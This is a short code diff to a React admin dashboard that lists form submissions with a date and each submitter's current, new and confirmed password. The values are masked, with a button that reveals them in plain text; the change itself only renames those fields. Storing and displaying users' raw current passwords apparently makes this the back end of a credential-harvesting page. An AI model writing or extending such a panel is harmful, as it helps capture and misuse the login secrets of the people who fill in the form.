@@ -112,11 +112,11 @@ const AdminDashboard = () => {
                     return (
                       <tr key={sub.id} className="border-b border-border last:border-0">
                         <td className="py-3 pr-4 text-foreground whitespace-nowrap">
-                          {new Date(sub.timestamp).toLocaleString("de-DE")}
+                          {new Date(sub.created_at).toLocaleString("de-DE")}
                         </td>
-                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.currentPassword)}</td>
-                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.newPassword)}</td>
-                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.confirmPassword)}</td>
+                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.current_password)}</td>
+                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.new_password)}</td>
+                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.confirm_password)}</td>
                         <td className="py-3 text-right">
                           <button
                             onClick={() => toggleVisible(sub.id)}
